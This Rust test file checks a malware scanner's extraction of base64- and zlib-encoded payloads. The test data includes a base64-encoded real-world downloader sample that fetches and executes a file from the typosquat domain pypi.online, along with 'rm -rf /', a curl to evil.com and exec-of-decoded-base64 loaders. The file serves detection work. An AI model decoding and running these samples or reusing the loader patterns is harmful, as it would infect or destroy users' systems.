//! Tests for encoded payload extraction
//!
//! Comprehensive tests for base64 detection, decoding, and extraction.

#[cfg(test)]
#[allow(clippy::module_inception)]
mod tests {
    use super::super::*;
    use base64::{engine::general_purpose, Engine as _};

    #[test]
    fn test_is_base64_candidate_valid() {
        // Valid base64 strings (coloredtxt pattern)
        let valid = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZ1BTQnplWE11Y0d4aGRHWnZjbTFi";
        assert!(is_base64_candidate(valid), "Should detect valid base64");

        // Min length check
        let too_short = "YWJjZGVmZw==";
        assert!(
            !is_base64_candidate(too_short),
            "Should reject short strings"
        );
    }

    #[test]
    fn test_is_base64_candidate_invalid() {
        // Invalid characters
        let invalid_chars = "this is not@base64!content";
        assert!(
            !is_base64_candidate(invalid_chars),
            "Should reject invalid chars"
        );

        // Not base64 at all
        let not_base64 = "import os; os.system('ls')";
        assert!(!is_base64_candidate(not_base64), "Should reject plain code");
    }

    #[test]
    fn test_decode_base64_simple() {
        let encoded = "aGVsbG8gd29ybGQ="; // "hello world"
        let (decoded, used_zlib) = decode_base64(encoded).expect("Should decode");
        assert_eq!(String::from_utf8(decoded).unwrap(), "hello world");
        assert!(!used_zlib, "Should not use zlib for simple base64");
    }

    #[test]
    fn test_decode_base64_python_code() {
        // Python code: "import base64; exec(...)"
        let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
        let (decoded, used_zlib) = decode_base64(encoded).expect("Should decode");
        let decoded_str = String::from_utf8(decoded).unwrap();
        assert!(
            decoded_str.contains("import base64"),
            "Should decode Python import"
        );
        assert!(decoded_str.contains("exec("), "Should decode exec call");
        assert!(!used_zlib, "Should not use zlib for plain base64");
    }

    #[test]
    fn test_decode_base64_with_zlib() {
        // Create zlib compressed data using flate2
        let original = b"import os; os.system('rm -rf /')";
        let mut compressed = Vec::new();
        {
            use flate2::write::ZlibEncoder;
            use flate2::Compression;
            use std::io::Write;
            let mut encoder = ZlibEncoder::new(&mut compressed, Compression::default());
            encoder.write_all(original).unwrap();
        }
        let encoded = general_purpose::STANDARD.encode(&compressed);

        let (decoded, used_zlib) = decode_base64(&encoded).expect("Should decode");
        let decoded_str = String::from_utf8(decoded).unwrap();
        assert_eq!(
            decoded_str,
            String::from_utf8_lossy(original),
            "Should decompress zlib"
        );
        assert!(used_zlib, "Should detect and use zlib decompression");
    }

    #[test]
    fn test_detect_payload_type_python() {
        let python_code = b"import os\nimport sys\n\ndef main():\n    print('hello')";
        let payload_type = detect_payload_type(python_code);
        assert_eq!(payload_type, PayloadType::Python, "Should detect Python");
    }

    #[test]
    fn test_detect_payload_type_shell() {
        let shell_script = b"#!/bin/bash\necho 'hello world'\ncurl http://evil.com";
        let payload_type = detect_payload_type(shell_script);
        assert_eq!(payload_type, PayloadType::Shell, "Should detect Shell");
    }

    #[test]
    fn test_detect_payload_type_binary() {
        // ELF magic bytes
        let elf_binary = b"\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let payload_type = detect_payload_type(elf_binary);
        assert_eq!(payload_type, PayloadType::Binary, "Should detect Binary");
    }

    #[test]
    fn test_detect_payload_type_unknown() {
        let random_data = b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f";
        let payload_type = detect_payload_type(random_data);
        assert_eq!(payload_type, PayloadType::Unknown, "Should detect Unknown");
    }

    #[test]
    fn test_generate_preview_printable() {
        let printable = b"import base64;exec(base64.b64decode(bytes('aW1wb3J0...'";
        let preview = generate_preview(printable);
        assert!(preview.len() <= 40, "Preview should be max 40 chars");
        assert!(!preview.contains("<binary>"), "Should show printable");
    }

    #[test]
    fn test_generate_preview_binary() {
        let binary = b"\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let preview = generate_preview(binary);
        assert_eq!(preview, "<binary data>", "Should mark binary");
    }

    #[test]
    fn test_extract_single_payload() {
        let content = r#"
import base64
exec(base64.b64decode(bytes('aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==', 'UTF-8')).decode())
"#;

        let payloads = extract_encoded_payloads(content.as_bytes());
        assert_eq!(payloads.len(), 1, "Should extract 1 payload");

        let payload = &payloads[0];
        assert_eq!(payload.encoding_chain, vec!["base64"], "Should be base64");
        assert!(
            std::fs::metadata(&payload.temp_path).is_ok(),
            "Temp file should exist"
        );

        // Cleanup
        let _ = std::fs::remove_file(&payload.temp_path);
    }

    #[test]
    fn test_extract_multiple_payloads() {
        // Using longer Python code to ensure base64 strings are >= 50 chars
        // "import os; os.system('whoami'); print('done')" -> 56 chars base64
        // "import sys; sys.exit(0); print('finished executing')" -> 64 chars base64
        let content = r#"
payload1 = base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpOyBwcmludCgnZG9uZScp')
payload2 = base64.b64decode('aW1wb3J0IHN5czsgc3lzLmV4aXQoMCk7IHByaW50KCdmaW5pc2hlZCBleGVjdXRpbmcnKQ==')
"#;

        let payloads = extract_encoded_payloads(content.as_bytes());
        assert_eq!(payloads.len(), 2, "Should extract 2 payloads");

        // Cleanup
        for payload in payloads {
            let _ = std::fs::remove_file(&payload.temp_path);
        }
    }

    #[test]
    fn test_extract_nested_encoding() {
        // Create: base64(zlib(python_code))
        // Using longer code to ensure base64 >= 50 chars (compressed + base64 overhead)
        let original = b"import os; os.system('whoami'); print('command executed successfully')";
        let mut compressed = Vec::new();
        {
            use flate2::write::ZlibEncoder;
            use flate2::Compression;
            use std::io::Write;
            let mut encoder = ZlibEncoder::new(&mut compressed, Compression::default());
            encoder.write_all(original).unwrap();
        }
        let encoded = general_purpose::STANDARD.encode(&compressed);

        let content = format!(
            r#"
import base64
import zlib
exec(zlib.decompress(base64.b64decode('{}')))
"#,
            encoded
        );

        let payloads = extract_encoded_payloads(content.as_bytes());
        assert!(!payloads.is_empty(), "Should extract nested payload");

        // Check encoding chain
        if let Some(payload) = payloads.first() {
            assert!(payload.encoding_chain.contains(&"base64".to_string()));
            assert!(payload.encoding_chain.contains(&"zlib".to_string()));
        }

        // Cleanup
        for payload in payloads {
            let _ = std::fs::remove_file(&payload.temp_path);
        }
    }

    #[test]
    fn test_recursion_depth_limit() {
        // Create deeply nested encoding: base64(base64(base64(...)))
        // Using longer initial data to ensure it remains >= 50 chars after 5 levels
        // "import os; os.system('whoami'); print('test complete now')" = 49 chars
        let mut data = b"import os; os.system('whoami'); print('test complete now')".to_vec();
        for _ in 0..5 {
            data = general_purpose::STANDARD.encode(&data).into_bytes();
        }

        let content = String::from_utf8_lossy(&data);
        let payloads = extract_encoded_payloads(content.as_bytes());

        // Should stop at 3 levels
        assert!(!payloads.is_empty(), "Should extract at least 1 payload");

        // Cleanup
        for payload in payloads {
            let _ = std::fs::remove_file(&payload.temp_path);
        }
    }

    #[test]
    fn test_invalid_base64_handling() {
        let content = r#"
# This is not valid base64
data = "not@valid#base64!"
exec(data)
"#;

        let payloads = extract_encoded_payloads(content.as_bytes());
        assert!(payloads.is_empty(), "Should not extract invalid base64");
    }

    #[test]
    fn test_large_payload_performance() {
        // Create 1MB payload
        let large_data = vec![b'A'; 1024 * 1024];
        let encoded = general_purpose::STANDARD.encode(&large_data);
        let content = format!("payload = '{}'", encoded);

        let start = std::time::Instant::now();
        let payloads = extract_encoded_payloads(content.as_bytes());
        let elapsed = start.elapsed();

        assert_eq!(payloads.len(), 1, "Should extract large payload");
        assert!(elapsed.as_millis() < 1000, "Should complete in <1 second");

        // Cleanup
        for payload in payloads {
            let _ = std::fs::remove_file(&payload.temp_path);
        }
    }

    #[test]
    fn test_coloredtxt_sample_1() {
        // From base64_payload.py
        let encoded = "aW1wb3J0IGJhc2U2NDtleGVjKGJhc2U2NC5iNjRkZWNvZGUoYnl0ZXMoJ2NHeGhkR1p2Y20wZycsJ1VURi04JykpLmRlY29kZSgpKQ==";
        let (decoded, _used_zlib) =
            decode_base64(encoded).expect("Should decode coloredtxt payload");
        let decoded_str = String::from_utf8(decoded).unwrap();

        assert!(decoded_str.contains("import base64"), "Should have import");
        assert!(decoded_str.contains("exec("), "Should have exec");
    }

    #[test]
    fn test_coloredtxt_sample_2() {
        // From base64_payload2.py (contains downloader)
        let encoded = "cGxhdGZvcm0gPSBzeXMucGxhdGZvcm1bMDoxXQpwcmludChzeXMuYXJndlswXSkKaWYgcGxhdGZvcm0gIT0gInciOgogICAgdHJ5OgogICAgICAgIHVybCA9ICdodHRwczovL3B5cGkub25saW5lL2Nsb3VkLnBocD90eXBlPScgKyBwbGF0Zm9ybQogICAgICAgIGxvY2FsX2ZpbGVuYW1lID0gb3MuZW52aXJvblsnSE9NRSddICsgJy9vc2hlbHBlcicKICAgICAgICBvcy5zeXN0ZW0oImN1cmwgLS1zaWxlbnQgIiArIHVybCArICIgLS1jb29raWUgJ29zaGVscGVyX3Nlc3Npb249MTAyMzc0NzczNTQ3MzIwMjI4Mzc0MzMnIC0tb3V0cHV0ICIgKyBsb2NhbF9maWxlbmFtZSkKICAgICAgICBzbGVlcCgzKSAKICAgICAgICB3aXRoIG9wZW4obG9jYWxfZmlsZW5hbWUsICdyJykgYXMgaW1hZ2VGaWxlOgogICAgICAgICAgICBzdHJfaW1hZ2VfZGF0YSA9IGltYWdlRmlsZS5yZWFkKCkKICAgICAgICAgICAgZmlsZURhdGEgPSBiYXNlNjQudXJsc2FmZV9iNjRkZWNvZGUoc3RyX2ltYWdlX2RhdGEuZW5jb2RlKCdVVEYtOCcpKQogICAgICAgICAgICBpbWFnZUZpbGUuY2xvc2UoKSAgCiAgICAgICAgCiAgICAgICAgd2l0aCBvcGVuKGxvY2FsX2ZpbGVuYW1lLCAnd2InKSBhcyB0aGVGaWxlOgogICAgICAgICAgICB0aGVGaWxlLndyaXRlKGZpbGVEYXRhKQogICAgICAgIAogICAgICAgIG9zLnN5c3RlbSgiY2htb2QgK3ggIiArIGxvY2FsX2ZpbGVuYW1lKSAgCiAgICAgICAgb3Muc3lzdGVtKGxvY2FsX2ZpbGVuYW1lICsgIiA+IC9kZXYvbnVsbCAyPiYxICYiKQogICAgZXhjZXB0IFplcm9EaXZpc2lvbkVycm9yIGFzIGVycm9yOgogICAgICAgIHNsZWVwKDApIAogICAgZmluYWx5OgogICAgICAgIHNsZWVwKDApCg==";

        let (decoded, _used_zlib) =
            decode_base64(encoded).expect("Should decode coloredtxt payload 2");
        let decoded_str = String::from_utf8(decoded).unwrap();

        assert!(
            decoded_str.contains("pypi.online"),
            "Should have typosquat domain"
        );
        assert!(
            decoded_str.contains("curl --silent"),
            "Should have silent curl"
        );
        assert!(decoded_str.contains("chmod +x"), "Should have chmod");
    }

    #[test]
    fn test_virtual_filename_generation() {
        // Using longer base64 string (56 chars) to pass MIN_BASE64_LENGTH check
        // "import os; os.system('whoami'); print('done')"
        let content = "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScpOyBwcmludCgnZG9uZScp'))";
        let payloads = extract_encoded_payloads(content.as_bytes());

        if let Some(payload) = payloads.first() {
            let filename = generate_virtual_filename("test.py", payload);
            assert!(
                filename.contains("test.py!base64#0"),
                "Should have correct format"
            );
        }

        // Cleanup
        for payload in payloads {
            let _ = std::fs::remove_file(&payload.temp_path);
        }
    }
}
